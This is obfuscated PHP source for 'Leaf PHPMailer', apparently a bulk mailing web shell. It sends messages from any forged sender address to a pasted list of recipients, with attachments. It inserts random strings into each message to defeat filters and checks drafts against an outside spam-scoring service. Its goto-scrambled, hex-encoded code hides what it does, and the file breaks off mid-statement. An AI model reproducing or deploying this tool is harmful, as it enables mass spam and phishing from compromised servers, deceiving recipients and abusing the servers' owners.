<?php
 goto yzoyy; Oss3K: if ($_POST["\x61\143\164\151\x6f\156"] == "\x73\x65\x6e\x64") { print "\x20\x20\x20\x20\x3c\144\x69\x76\40\x63\x6c\141\163\x73\75\42\x63\157\154\x2d\154\147\55\61\x32\42\76"; $maillist = explode("\xd\12", $emailList); $n = count($maillist); $x = 1; foreach ($maillist as $email) { print "\74\144\x69\x76\x20\143\x6c\x61\163\x73\75\42\143\157\x6c\x2d\x6c\x67\x2d\61\42\x3e\x5b" . $x . "\x2f" . $n . "\135\x3c\57\x64\x69\166\76\x3c\x64\151\166\x20\143\x6c\x61\x73\x73\75\42\143\x6f\x6c\55\x6c\147\55\64\42\76" . $email . "\x3c\x2f\x64\151\166\76"; if (!leafMailCheck($email)) { print "\x3c\x64\151\x76\40\x63\x6c\x61\x73\163\75\42\143\157\x6c\x2d\154\147\55\x36\42\x3e\74\163\160\141\156\40\x63\x6c\x61\163\163\x3d\x22\x6c\x61\142\x65\x6c\x20\x6c\141\142\x65\x6c\x2d\x64\x65\146\141\x75\154\x74\x22\x3e\111\x6e\x63\x6f\162\x72\x65\x63\x74\x20\105\x6d\x61\151\154\x3c\x2f\163\x70\141\156\x3e\74\x2f\144\151\166\x3e"; print "\x3c\x62\162\76\xd\12"; } else { $mail = new PHPMailer(); $mail->setFrom(leafClear($senderEmail, $email), leafClear($senderName, $email)); $mail->addReplyTo(leafClear($replyTo, $email)); $mail->addAddress($email); $mail->Subject = leafClear($subject, $email); $mail->Body = leafClear($messageLetter, $email); if ($messageType == 1) { $mail->IsHTML(true); $mail->AltBody = strip_tags(leafClear($messageLetter, $email)); } else { $mail->IsHTML(false); } $mail->CharSet = $charset; $mail->Encoding = $encoding; for ($i = 0; $i < count($_FILES["\141\164\164\x61\x63\150\155\145\x6e\x74"]["\x6e\x61\155\145"]); $i++) { if ($_FILES["\141\x74\164\x61\143\150\x6d\x65\x6e\164"]["\164\155\x70\x5f\x6e\x61\x6d\x65"][$i] != '') { $mail->AddAttachment($_FILES["\141\x74\x74\x61\143\x68\x6d\145\x6e\164"]["\164\x6d\160\x5f\x6e\x61\155\145"][$i], $_FILES["\x61\x74\x74\x61\143\150\x6d\x65\156\x74"]["\156\x61\x6d\145"][$i]); } } if (!$mail->send()) { echo "\x3c\144\151\166\x20\x63\x6c\x61\163\163\75\x22\143\157\x6c\x2d\x6c\147\x2d\x36\x22\76\74\x73\x70\x61\156\40\x63\x6c\141\x73\163\x3d\x22\x6c\x61\x62\x65\154\x20\154\141\x62\145\154\x2d\144\x65\146\141\165\154\x74\x22\76" . htmlspecialchars($mail->ErrorInfo) . "\x3c\x2f\163\x70\x61\x6e\76\74\x2f\144\151\166\76"; } else { echo "\74\x64\151\x76\x20\x63\154\141\x73\163\x3d\x22\143\x6f\x6c\x2d\154\x67\55\66\42\x3e\74\x73\160\141\x6e\x20\143\154\x61\163\x73\x3d\x22\x6c\x61\142\x65\x6c\40\x6c\x61\x62\145\154\x2d\x73\x75\143\x63\145\x73\x73\42\76\x4f\x6b\74\57\x73\x70\141\x6e\x3e\x3c\x2f\x64\151\x76\76"; } print "\74\142\x72\76\xd\xa"; } $x++; for ($k = 0; $k < 40000; $k++) { echo "\40"; } } } elseif ($_POST["\x61\143\164\151\157\156"] == "\x73\143\x6f\x72\145") { $mail = new PHPMailer(); $mail->setFrom(leafClear($senderEmail, $email), leafClear($senderName, $email)); $mail->addReplyTo(leafClear($replyTo, $email)); $mail->addAddress("\x75\163\x65\162\x6e\x61\x6d\145\100\x64\x6f\155\141\151\x6e\x2e\x63\157\x6d"); $mail->Subject = leafClear($subject, $email); $mail->Body = leafClear($messageLetter, $email); if ($messageType == 1) { $mail->IsHTML(true); $mail->AltBody = strip_tags(leafClear($messageLetter, $email)); } else { $mail->IsHTML(false); } $mail->CharSet = $charset; $mail->Encoding = $encoding; $mail->preSend(); $messageHeaders = $mail->getSentMIMEMessage(); $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, "\150\x74\x74\160\x3a\57\x2f\163\x70\x61\x6d\143\x68\145\143\153\x2e\160\157\163\x74\155\141\x72\x6b\141\x70\x70\56\143\157\155\57\146\x69\154\164\x65\162"); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array("\x65\155\x61\151\154" => $messageHeaders, "\157\x70\164\151\157\x6e\163" => "\x6c\157\x6e\x67"))); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 15); $response = curl_exec($ch); $response = json_decode($response); print "\x20\x20\40\x20\74\144\151\166\x20\x63\154\x61\x73\x73\75\42\143\157\154\55\154\147\x2d\61\62\42\x3e"; if ($response->success == TRUE) { $score = $response->score; if ($score > 5) { $class = "\144\x61\x6e\147\x65\162"; } else { $class = "\163\x75\143\143\x65\x73\x73"; } print "\x3c\144\151\166\x20\x63\154\x61\163\x73\75\42\164\145\x78\x74\x2d" . $class . "\x22\76\131\x6f\165\162\x20\123\x70\x61\155\x41\x73\163\141\x73\x73\151\x6e\x20\x73\x63\157\x72\145\40\151\x73\x20" . $score . "\x20\x20\74\x2f\x64\151\x76\x3e\12\x3c\144\151\166\x3e\106\x75\x6c\154\x20\x52\x65\160\x6f\162\x74\40\72\40\x3c\160\162\145\76" . $response->report . "\x3c\x2f\160\162\x65\x3e\x3c\x2f\x64\151\166\x3e"; print "\x20\x20\40\40\x3c\57\144\x69\x76\x3e"; } } goto BOYG5; v4own: set_time_limit(0); goto cWAaV; ViLok: $leaf["\x77\x65\142\x73\151\164\x65"] = "\154\145\141\146\x6d\x61\151\x6c\x65\x72\x2e\x70\x77"; goto nWQnq; WFc4L: $html = "\x63\150\x65\x63\x6b\145\x64"; goto L1bgH; yzoyy: ?>
<title>Leaf</title><?php  goto iuy05; ZUtlj: if ($_POST["\141\x63\164\151\157\156"] == "\163\x65\x6e\x64" or $_POST["\141\143\164\x69\x6f\x6e"] == "\163\143\x6f\x72\145") { $senderEmail = leafTrim($_POST["\x73\x65\x6e\x64\145\162\105\155\x61\x69\x6c"]); $senderName = leafTrim($_POST["\163\145\x6e\x64\145\162\x4e\141\x6d\x65"]); $replyTo = leafTrim($_POST["\162\x65\x70\x6c\x79\x54\x6f"]); $subject = leafTrim($_POST["\x73\165\142\152\145\x63\x74"]); $emailList = leafTrim($_POST["\145\x6d\x61\151\x6c\114\151\163\164"]); $messageType = leafTrim($_POST["\x6d\x65\x73\x73\141\x67\x65\124\x79\x70\145"]); $messageLetter = leafTrim($_POST["\x6d\145\x73\x73\x61\147\x65\114\x65\164\x74\145\x72"]); $encoding = $_POST["\145\156\143\157\x64\145"]; $charset = $_POST["\x63\150\141\162\163\145\x74"]; $html = ''; $utf8 = ''; $bit8 = ''; if ($messageType == 2) { $plain = "\143\x68\145\x63\153\145\144"; } else { $html = "\x63\x68\145\x63\153\x65\x64"; } if ($charset == "\111\x53\x4f\x2d\x38\x38\x35\x39\x2d\x31") { $iso = "\x73\x65\154\x65\143\x74\x65\x64"; } else { $utf8 = "\x73\x65\154\x65\143\x74\x65\144"; } if ($encoding == "\x37\142\151\x74") { $bit7 = "\163\x65\154\145\x63\x74\145\144"; } elseif ($encoding == "\x62\x69\156\141\x72\x79") { $binary = "\163\145\x6c\x65\143\x74\x65\x64"; } elseif ($encoding == "\142\141\163\145\66\x34") { $base64 = "\x73\145\x6c\145\143\x74\145\144"; } elseif ($encoding == "\161\x75\157\164\x65\144\55\160\162\x69\x6e\164\141\142\154\x65") { $quotedprintable = "\x73\145\x6c\145\x63\x74\145\x64"; } else { $bit8 = "\x73\145\x6c\x65\143\164\x65\144"; } } goto w6B8R; M7fuF: function leafClear($text, $email) { $e = explode("\100", $email); $emailuser = $e[0]; $emaildomain = $e[1]; $text = str_replace("\x5b\x2d\x74\151\x6d\x65\55\x5d", date("\x6d\x2f\144\x2f\x59\x20\150\x3a\x69\72\163\40\x61", time()), $text); $text = str_replace("\133\x2d\x65\155\141\x69\x6c\55\135", $email, $text); $text = str_replace("\x5b\55\145\155\x61\x69\x6c\x75\163\145\x72\55\135", $emailuser, $text); $text = str_replace("\x5b\55\x65\155\x61\x69\x6c\x64\x6f\155\141\x69\x6e\x2d\135", $emaildomain, $text); $text = str_replace("\133\55\x72\x61\156\144\x6f\155\154\x65\164\164\145\162\163\x2d\x5d", randString("\141\142\143\x64\x65\x66\x67\150\x69\152\x6b\x6c\x6d\156\157\160\x71\162\163\x74\x75\166\167\x78\x79\172"), $text); $text = str_replace("\133\x2d\x72\x61\x6e\144\x6f\x6d\163\x74\x72\151\156\147\x2d\x5d", randString("\141\142\143\144\x65\x66\147\150\151\152\153\x6c\x6d\x6e\x6f\160\161\x72\x73\x74\165\166\167\170\x79\x7a\x30\x31\x32\63\64\x35\x36\x37\x38\x39"), $text); $text = str_replace("\133\55\x72\x61\156\x64\x6f\155\x6e\165\x6d\x62\x65\x72\55\135", randString("\60\61\x32\x33\64\65\x36\67\x38\71"), $text); $text = str_replace("\x5b\x2d\162\x61\156\x64\157\x6d\x6d\144\x35\x2d\x5d", md5(randString("\141\142\x63\144\145\146\x67\150\151\x6a\153\154\155\156\x6f\x70\161\x72\x73\164\165\x76\x77\x78\171\x7a\x30\61\x32\x33\x34\x35\x36\x37\70\x39")), $text); return $text; } goto fr3qN; f16Zk: print "\x3c\142\157\144\x79\x3e"; goto ZGeOo; ZGeOo: print "\x3c\x64\x69\166\40\x63\x6c\141\163\163\x3d\42\x63\x6f\156\164\141\151\x6e\145\162\x20\x63\x6f\154\55\x6c\147\55\66\x22\x3e\12\40\40\40\40\x20\40\40\x20\x3c\x68\63\x3e\74\146\x6f\x6e\164\x20\x63\157\x6c\x6f\x72\x3d\42\147\162\145\145\x6e\42\x3e\74\x73\x70\141\x6e\x20\x63\x6c\x61\163\x73\x3d\x22\x67\x6c\x79\160\150\151\143\x6f\x6e\40\147\154\171\160\x68\151\143\157\156\x2d\154\x65\141\146\42\76\x3c\x2f\163\160\x61\x6e\x3e\x3c\x2f\x66\x6f\x6e\x74\76\40\114\145\x61\x66\x20\120\x48\120\115\x61\x69\154\145\x72\x20\x3c\x73\155\x61\x6c\x6c\76" . $leaf["\166\x65\162\x73\x69\157\156"] . "\74\x2f\163\x6d\141\154\154\x3e\x3c\57\x68\x33\76\xa\x20\40\x20\x20\40\x20\x20\40\x3c\146\157\162\155\x20\x6e\x61\155\145\75\x22\x66\x6f\x72\x6d\x22\40\151\144\75\x22\146\157\162\x6d\42\40\x6d\x65\164\x68\x6f\144\x3d\x22\120\117\x53\x54\x22\x20\145\x6e\x63\164\x79\x70\145\75\x22\x6d\165\154\x74\x69\x70\x61\162\x74\57\146\157\x72\155\x2d\144\x61\164\141\x22\40\141\143\x74\151\157\x6e\75\x22\x22\76\xa\x20\x20\40\x20\40\x20\x20\40\x20\x20\40\x20\40\x20\40\x20\40\x20\40\x20\x3c\151\x6e\160\165\164\40\x74\x79\160\145\x3d\42\150\151\144\x64\x65\x6e\42\40\156\141\x6d\145\75\x22\141\143\164\x69\x6f\x6e\42\40\x76\x61\x6c\x75\145\75\42\163\x63\x6f\162\145\x22\76\12\xa\40\x20\x20\40\x20\40\x20\40\x20\x20\x20\40\x3c\144\x69\166\x20\143\154\141\x73\163\x3d\x22\162\157\x77\42\76\xa\x20\40\x20\40\x20\40\x20\x20\40\x20\x20\40\x20\40\x20\x20\x3c\x64\x69\166\x20\x63\154\141\163\x73\75\42\x66\157\x72\x6d\x2d\147\x72\x6f\165\160\x20\143\157\x6c\55\154\147\x2d\x36\40\42\76\x3c\154\x61\142\x65\x6c\x20\146\x6f\x72\x3d\x22\x73\145\156\x64\145\162\x45\x6d\x61\x69\154\42\x3e\x45\155\141\x69\154\x3c\57\154\141\142\145\154\x3e\74\x69\156\x70\x75\164\x20\x74\x79\x70\x65\75\42\164\x65\170\x74\42\x20\x63\x6c\141\x73\x73\75\x22\x66\x6f\x72\155\x2d\x63\157\x6e\164\162\157\154\40\x20\x69\x6e\x70\x75\164\55\163\x6d\x20\x22\40\151\144\75\42\x73\145\156\144\145\162\x45\155\141\151\154\42\40\x6e\141\155\x65\x3d\x22\x73\x65\x6e\x64\145\162\105\x6d\141\x69\154\x22\x20\166\141\154\165\145\75\42" . $senderEmail . "\42\76\74\57\144\x69\166\x3e\12\40\x20\x20\40\x20\x20\x20\x20\x20\x20\40\40\x20\x20\x20\x20\x3c\144\x69\166\40\143\154\x61\163\x73\75\42\x66\157\162\155\55\x67\162\x6f\165\x70\x20\143\x6f\154\x2d\154\x67\55\66\x20\42\76\x3c\154\141\x62\145\154\40\146\x6f\162\75\x22\x73\x65\x6e\144\145\162\x4e\x61\155\145\42\x3e\x53\x65\x6e\144\145\x72\x20\116\x61\155\145\x3c\x2f\154\x61\x62\x65\x6c\76\74\151\156\160\165\164\40\x74\x79\160\145\75\x22\x74\x65\170\x74\x22\40\x63\154\141\163\163\75\x22\146\157\x72\155\x2d\x63\x6f\x6e\x74\162\157\x6c\40\x20\x69\x6e\160\165\164\x2d\163\x6d\40\42\x20\151\x64\75\42\163\x65\156\144\x65\162\x4e\x61\155\145\42\x20\x6e\x61\x6d\145\75\x22\x73\145\x6e\x64\145\162\116\x61\x6d\x65\42\40\166\141\154\165\x65\x3d\42" . $senderName . "\x22\76\x3c\x2f\x64\x69\x76\x3e\xa\40\40\40\40\40\40\x20\x20\40\40\40\x20\74\x2f\144\x69\166\76\12\40\x20\x20\x20\x20\40\x20\x20\x20\40\x20\40\x3c\144\151\166\40\x63\154\x61\x73\x73\x3d\x22\x72\x6f\x77\x22\76\xa\x20\40\x20\x20\x20\40\40\40\x20\x20\x20\40\x20\40\40\x20\74\163\160\141\x6e\40\x63\154\x61\163\x73\x3d\42\x66\x6f\x72\155\55\x67\162\x6f\x75\160\40\143\x6f\x6c\55\x6c\x67\x2d\66\40\x20\x22\x3e\x3c\154\x61\x62\145\154\40\146\157\x72\75\42\x61\x74\x74\x61\143\150\x6d\145\x6e\x74\x22\76\x41\164\x74\141\143\x68\155\x65\156\x74\40\x3c\x73\x6d\141\154\x6c\x3e\x28\x4d\165\154\x74\151\160\154\145\x20\101\166\141\151\154\x61\x62\x6c\145\x29\x3c\x2f\x73\x6d\x61\154\x6c\x3e\74\x2f\154\141\x62\x65\154\x3e\x3c\x69\x6e\x70\x75\x74\x20\164\x79\160\x65\75\42\146\x69\x6c\x65\x22\x20\156\141\155\145\75\x22\141\x74\x74\x61\143\150\x6d\145\x6e\164\x5b\x5d\42\40\151\x64\75\x22\x61\x74\164\141\x63\150\155\145\156\164\x5b\x5d\42\x20\x6d\x75\154\x74\x69\x70\154\145\57\x3e\74\57\163\x70\x61\x6e\x3e\xa\xa\40\x20\x20\x20\x20\40\40\x20\40\x20\x20\x20\40\x20\x20\40\x3c\144\151\x76\x20\143\154\x61\x73\x73\x3d\42\146\157\x72\x6d\55\x67\x72\x6f\x75\x70\x20\143\157\x6c\55\154\x67\55\66\42\76\x3c\154\x61\142\145\x6c\x20\146\x6f\x72\75\x22\x72\145\x70\154\171\x54\x6f\42\76\122\x65\x70\154\171\x2d\164\x6f\x3c\x2f\154\141\142\x65\x6c\76\x3c\151\156\160\x75\164\x20\x74\x79\160\145\x3d\42\164\145\x78\164\x22\x20\x63\x6c\141\163\163\x3d\x22\146\x6f\x72\155\x2d\143\157\156\164\x72\x6f\154\40\40\x69\x6e\160\x75\164\x2d\x73\x6d\40\42\x20\x69\x64\x3d\x22\x72\x65\160\154\171\x54\x6f\42\40\156\141\155\145\75\x22\162\x65\160\154\171\x54\x6f\x22\40\166\x61\x6c\165\145\75\x22" . $replyTo . "\x22\40\57\x3e\74\57\144\x69\166\x3e\xa\40\40\40\x20\40\x20\x20\40\40\x20\x20\40\74\x2f\144\151\166\x3e\xa\x20\x20\40\x20\x20\x20\40\x20\x20\x20\x20\40\x3c\x64\x69\166\x20\x63\154\141\163\163\75\x22\162\157\x77\42\x3e\xa\40\x20\x20\40\40\x20\x20\40\x20\40\40\40\40\x20\40\x20\74\x64\151\x76\40\143\154\x61\163\x73\x3d\x22\x66\157\x72\155\x2d\147\x72\157\x75\160\40\143\157\154\55\x6c\x67\x2d\61\62\40\x22\x3e\74\x6c\141\x62\x65\154\40\146\157\x72\75\42\163\165\x62\x6a\145\x63\x74\42\x3e\x53\x75\142\152\145\143\164\74\57\x6c\141\142\145\x6c\76\x3c\x69\x6e\160\165\x74\40\x74\171\x70\145\75\x22\x74\145\170\x74\42\40\x63\154\141\163\x73\x3d\x22\146\157\162\155\x2d\143\157\156\164\162\x6f\x6c\x20\x20\x69\156\x70\x75\x74\x2d\163\155\x20\x22\40\151\144\75\x22\x73\165\142\x6a\145\x63\164\x22\x20\x6e\141\x6d\x65\x3d\42\x73\165\x62\152\x65\x63\x74\42\x20\166\x61\x6c\165\145\x3d\42" . $subject . "\x22\x20\57\x3e\x3c\x2f\144\151\166\x3e\12\x20\40\40\40\x20\40\40\40\x20\40\x20\40\74\x2f\144\151\166\76\12\40\40\x20\x20\40\x20\x20\x20\x20\x20\40\40\x3c\144\151\x76\x20\143\x6c\141\163\x73\75\42\162\x6f\167\42\76\12\40\x20\40\x20\x20\x20\40\x20\40\x20\40\x20\40\x20\40\40\74\x64\x69\x76\x20\143\x6c\x61\163\x73\75\42\146\157\162\x6d\55\147\x72\x6f\165\160\x20\143\157\x6c\55\154\x67\55\66\42\x3e\74\x6c\141\x62\x65\154\40\x66\157\x72\x3d\x22\155\x65\163\x73\x61\147\x65\x4c\x65\164\164\x65\x72\x22\x3e\x4d\145\163\163\141\x67\x65\40\x4c\x65\x74\164\145\162\40\x3c\x62\165\164\x74\x6f\156\x20\164\171\160\x65\75\42\x73\165\142\155\151\x74\x22\40\x63\x6c\x61\163\x73\x3d\42\x62\x74\156\x20\142\164\x6e\x2d\144\x65\146\x61\165\154\164\40\x62\x74\x6e\55\170\163\42\40\146\157\x72\155\75\x22\x66\157\162\x6d\42\40\x6e\x61\x6d\x65\75\42\x61\x63\x74\x69\157\x6e\42\x20\x76\x61\x6c\x75\145\75\x22\x76\151\145\x77\42\x20\146\157\x72\155\x74\x61\162\147\x65\164\75\x22\137\142\x6c\x61\x6e\153\x22\76\120\x72\x65\166\x69\x65\x77\x20\74\x2f\142\x75\x74\x74\x6f\156\76\x3c\57\154\141\x62\x65\154\x3e\74\164\145\x78\x74\x61\162\x65\141\x20\156\x61\155\x65\x3d\42\155\145\163\x73\x61\x67\x65\x4c\145\164\164\x65\162\x22\x20\x69\144\75\42\155\x65\x73\x73\x61\x67\x65\x4c\145\164\x74\x65\162\42\x20\x63\154\141\163\x73\75\42\146\157\162\155\55\x63\157\x6e\164\x72\157\154\42\40\x72\157\167\x73\75\42\x31\60\x22\40\x69\x64\75\42\164\145\170\164\101\x72\x65\141\42\x3e" . $messageLetter . "\74\x2f\x74\x65\x78\164\141\162\x65\141\76\x3c\57\x64\x69\x76\76\12\40\40\x20\40\x20\x20\40\x20\x20\40\40\40\40\x20\40\x20\x3c\x64\x69\166\40\x63\154\x61\163\163\x3d\x22\146\157\x72\155\55\x67\x72\157\x75\x70\40\x63\x6f\x6c\x2d\154\x67\55\66\x20\x22\x3e\74\154\x61\142\x65\154\40\146\x6f\162\75\x22\145\155\141\x69\x6c\x4c\x69\x73\164\x22\76\x45\x6d\141\x69\x6c\40\114\151\x73\164\x20\74\141\x20\150\162\145\146\75\42\77\145\155\141\151\154\146\x69\x6c\164\145\x72\x3d\157\x6e\x22\40\164\x61\162\x67\145\x74\75\42\x5f\x62\x6c\141\156\x6b\x22\40\143\x6c\x61\x73\163\x3d\42\142\x74\x6e\x20\142\x74\x6e\55\x64\145\x66\141\x75\154\164\x20\x62\164\x6e\x2d\x78\163\x22\x3e\x46\x69\x6c\164\145\x72\x2f\x45\170\164\x72\141\x63\164\x3c\57\x61\76\74\x2f\154\x61\142\x65\154\x3e\74\x74\x65\x78\164\x61\162\x65\141\40\x6e\x61\155\145\x3d\x22\x65\155\x61\151\154\x4c\x69\163\x74\42\40\151\x64\75\x22\145\155\141\x69\154\x4c\x69\163\164\x22\40\x63\x6c\141\163\x73\x3d\x22\146\157\162\x6d\55\x63\157\156\x74\162\x6f\154\x22\40\162\157\167\x73\x3d\42\x31\x30\42\x20\x69\x64\x3d\42\164\x65\170\164\x41\162\145\x61\x22\x3e" . $emailList . "\x3c\x2f\164\x65\170\164\141\x72\145\141\x3e\x3c\57\x64\x69\x76\76\xa\40\x20\x20\40\40\40\40\x20\x20\40\40\x20\x3c\x2f\144\x69\166\76\xa\40\40\x20\x20\40\x20\x20\40\40\40\40\x20\74\x64\151\x76\40\143\154\141\163\163\75\42\162\157\167\42\76\xa\40\x20\40\40\x20\40\x20\40\x20\40\40\x20\40\40\40\40\x3c\144\x69\x76\40\143\154\141\x73\163\x3d\42\146\x6f\x72\x6d\55\147\162\x6f\165\x70\x20\143\157\x6c\55\154\147\x2d\66\40\x22\76\xa\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\40\40\40\40\40\x20\x20\40\x20\x20\74\154\141\142\x65\x6c\40\x66\157\x72\x3d\42\x6d\x65\163\163\141\x67\145\124\x79\x70\145\42\x3e\115\145\x73\x73\x61\x67\145\x20\124\171\x70\145\74\x2f\154\141\x62\x65\154\x3e\12\40\x20\x20\40\x20\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\x20\x20\x20\x48\124\x4d\x4c\x20\74\x69\156\160\165\x74\x20\x74\x79\160\x65\75\x22\x72\x61\x64\x69\157\42\x20\156\x61\155\145\x3d\42\x6d\145\x73\x73\141\x67\145\124\x79\x70\145\x22\x20\x69\x64\x3d\42\155\x65\163\x73\141\147\x65\x54\171\160\x65\42\x20\166\141\x6c\165\x65\x3d\x22\x31\42\40" . $html . "\x3e\xa\40\40\x20\x20\x20\40\40\x20\40\40\x20\x20\x20\40\x20\40\40\40\x20\x20\x50\x6c\x61\151\x6e\74\x69\156\160\165\x74\x20\164\171\160\145\x3d\x22\x72\141\144\151\x6f\x22\40\156\x61\x6d\145\75\42\155\145\163\x73\141\147\145\124\x79\x70\x65\x22\40\x69\144\x3d\42\x6d\x65\163\163\x61\147\145\124\171\x70\x65\x22\40\166\x61\x6c\x75\145\x3d\x22\x32\x22\40" . $plain . "\76\xa\x20\40\x20\x20\x20\x20\x20\x20\40\40\40\x20\x20\x20\40\40\x3c\x2f\x64\151\x76\x3e\12\x20\40\40\40\40\x20\40\40\x20\40\x20\x20\x20\40\40\40\x3c\144\151\166\x20\x63\154\x61\163\x73\x3d\x22\146\157\162\x6d\x2d\147\162\x6f\165\x70\40\143\x6f\x6c\55\154\147\x2d\x33\40\42\x3e\xa\40\x20\x20\40\40\x20\x20\40\40\x20\x20\x20\x20\40\40\40\40\40\40\40\x3c\154\x61\142\x65\x6c\40\146\157\x72\75\42\143\x68\x61\x72\x73\x65\x74\x22\x3e\103\x68\141\x72\x61\143\164\x65\x72\x20\163\145\x74\74\57\x6c\x61\142\145\x6c\76\xa\x20\40\x20\40\40\40\40\40\40\x20\40\x20\x20\40\x20\x20\x20\40\40\40\x3c\163\x65\154\x65\143\164\x20\143\154\141\x73\x73\x3d\42\146\157\162\155\x2d\x63\x6f\156\x74\x72\157\154\x20\x69\156\160\x75\164\x2d\x73\x6d\x22\40\x69\x64\x3d\x22\x63\x68\141\x72\x73\x65\164\x22\40\x6e\141\x6d\x65\x3d\42\143\x68\x61\x72\x73\145\x74\x22\x3e\xa\40\40\40\x20\40\x20\x20\x20\x20\40\x20\x20\x20\40\40\40\40\x20\x20\40\x20\x20\40\x20\74\157\x70\x74\x69\157\156\x20" . $utf8 . "\x3e\x55\124\x46\55\70\74\57\157\x70\x74\151\x6f\156\76\xa\40\40\40\x20\40\x20\x20\40\40\40\x20\40\x20\40\x20\x20\x20\x20\40\40\x20\x20\x20\x20\x3c\157\x70\164\151\x6f\x6e\40" . $iso . "\76\x49\x53\117\55\70\x38\x35\x39\55\61\74\x2f\x6f\x70\164\x69\157\156\76\xa\x20\x20\x20\x20\x20\40\40\x20\40\40\40\40\40\x20\40\40\x20\x20\40\40\x3c\x2f\x73\x65\x6c\145\143\x74\76\12\40\40\x20\x20\x20\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\40\74\x2f\x64\151\x76\76\12\x20\40\x20\x20\40\x20\x20\40\x20\40\x20\x20\x20\x20\x20\40\x3c\144\151\x76\40\x63\x6c\x61\163\x73\75\42\146\x6f\162\x6d\55\x67\x72\157\x75\160\40\143\x6f\154\55\154\x67\55\x33\x20\42\76\12\40\x20\40\x20\x20\40\40\40\x20\x20\40\x20\40\40\x20\x20\40\x20\x20\40\x3c\x6c\x61\x62\x65\154\40\x66\x6f\162\x3d\42\x65\x6e\143\x6f\x64\x69\156\x67\x22\x3e\115\145\x73\163\141\x67\x65\40\x65\x6e\143\x6f\144\151\x6e\x67\x3c\57\x6c\141\142\x65\x6c\x3e\12\40\40\x20\x20\x20\40\x20\40\40\x20\40\40\40\40\x20\x20\x20\40\40\x20\x3c\163\x65\x6c\145\143\164\x20\x63\154\x61\163\163\75\42\146\157\x72\155\55\143\x6f\156\x74\162\x6f\x6c\40\151\156\x70\x75\164\x2d\x73\155\x22\x20\x69\144\x3d\42\145\156\143\x6f\x64\145\42\40\156\141\x6d\145\x3d\x22\145\156\x63\x6f\x64\x65\x22\76\12\40\x20\40\40\x20\40\40\x20\x20\x20\x20\40\x20\40\40\x20\x20\x20\40\40\40\40\x20\40\74\157\x70\164\151\157\156\x20" . $bit8 . "\76\70\142\x69\164\74\x2f\157\x70\x74\x69\x6f\156\76\12\40\40\40\x20\x20\x20\40\x20\40\40\40\40\40\x20\x20\40\40\40\x20\x20\40\x20\40\x20\74\157\160\164\x69\157\156\x20" . $bit7 . "\x3e\x37\142\151\164\x3c\57\x6f\x70\x74\151\x6f\156\x3e\xa\40\x20\40\40\x20\x20\40\40\40\x20\40\x20\x20\x20\x20\x20\40\40\40\40\x20\x20\40\40\74\157\x70\164\x69\157\x6e\x20" . $binary . "\x3e\x62\151\156\141\162\x79\x3c\57\157\160\x74\151\157\156\76\xa\40\x20\40\40\x20\40\x20\x20\x20\x20\x20\40\40\x20\40\x20\x20\40\x20\40\40\40\40\x20\x3c\x6f\160\x74\151\157\x6e\40" . $base64 . "\76\142\141\163\145\x36\64\74\x2f\x6f\160\x74\x69\157\156\76\xa\x20\40\x20\x20\x20\x20\x20\x20\40\40\x20\x20\x20\40\40\x20\x20\40\x20\x20\x20\40\40\x20\x3c\x6f\160\164\x69\157\156\x20" . $quotedprintable . "\76\161\x75\157\x74\x65\144\x2d\x70\x72\151\156\x74\x61\x62\154\145\x3c\x2f\157\160\164\x69\x6f\156\76\12\12\40\40\40\40\x20\x20\40\40\40\40\x20\40\x20\40\40\x20\40\x20\x20\40\74\57\x73\x65\x6c\x65\x63\x74\76\12\40\x20\40\40\40\x20\x20\x20\x20\40\40\40\x20\x20\40\40\74\57\x64\x69\166\x3e\12\x20\40\40\40\40\x20\x20\40\x20\x20\40\40\x3c\x2f\144\x69\x76\76\12\40\40\x20\40\40\x20\40\x20\40\x20\x20\40\74\x62\x75\164\164\157\156\40\x74\x79\x70\145\75\x22\163\165\x62\155\151\164\x22\40\143\154\141\x73\x73\75\42\142\164\x6e\40\142\164\x6e\x2d\x64\145\146\x61\165\154\164\x20\142\x74\x6e\x2d\163\155\42\40\146\157\x72\x6d\x3d\42\x66\x6f\x72\x6d\42\40\x6e\x61\x6d\x65\75\42\141\x63\164\x69\157\156\x22\40\166\141\154\x75\145\75\42\163\x65\156\144\42\x3e\123\105\x4e\104\74\x2f\x62\x75\164\x74\x6f\156\76\40\157\x72\x20\74\x61\40\x68\162\145\146\x3d\42\x23\x22\x20\x6f\156\x63\154\x69\x63\x6b\x3d\x22\x64\157\x63\165\x6d\145\x6e\164\56\x67\145\x74\x45\154\145\155\145\x6e\x74\x42\x79\111\x64\x28\47\146\x6f\x72\155\47\x29\x2e\163\x75\x62\155\151\x74\x28\x29\x3b\40\x72\145\164\x75\162\156\x20\x66\141\x6c\x73\x65\x3b\x22\76\x63\150\145\x63\153\40\123\x70\141\155\101\x73\x73\141\x73\163\x69\x6e\x20\x53\x63\x6f\x72\145\x3c\57\141\x3e\xa\x20\40\x20\12\40\x20\40\40\x20\x20\40\40\x3c\57\146\x6f\x72\155\x3e\12\40\40\40\40\74\x2f\144\151\x76\76\12\x20\x20\40\40\74\x64\151\x76\x20\143\154\x61\163\x73\75\42\x63\x6f\x6c\55\154\x67\x2d\66\x22\x3e\74\x62\x72\76\12\40\x20\40\x20\40\x20\40\40\x3c\x6c\141\x62\145\x6c\x20\146\x6f\162\75\x22\167\x65\154\154\x22\x3e\111\x6e\163\x74\x72\x75\143\x74\x69\157\x6e\74\57\x6c\141\142\x65\x6c\76\12\x20\40\40\40\40\x20\x20\40\x3c\144\151\x76\40\151\x64\x3d\x22\x77\145\x6c\154\x22\40\x63\154\x61\163\x73\75\x22\x77\145\x6c\x6c\40\x77\x65\154\154\42\76\xa\40\40\x20\x20\x20\x20\40\40\40\x20\40\x20\74\x68\64\x3e\x53\145\162\166\145\x72\40\111\156\x66\157\x72\155\141\164\151\157\x6e\x3c\57\x68\x34\76\xa\40\x20\40\x20\x20\x20\x20\40\x20\40\40\40\x3c\x75\154\x3e\12\40\40\x20\40\40\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\x3c\x6c\151\76\x53\x65\x72\x76\x65\x72\x20\111\x50\x20\101\x64\144\x72\x65\x73\x73\x20\x3a\x20\x3c\142\x3e" . $_SERVER["\x53\105\x52\126\x45\122\x5f\101\x44\x44\x52"] . 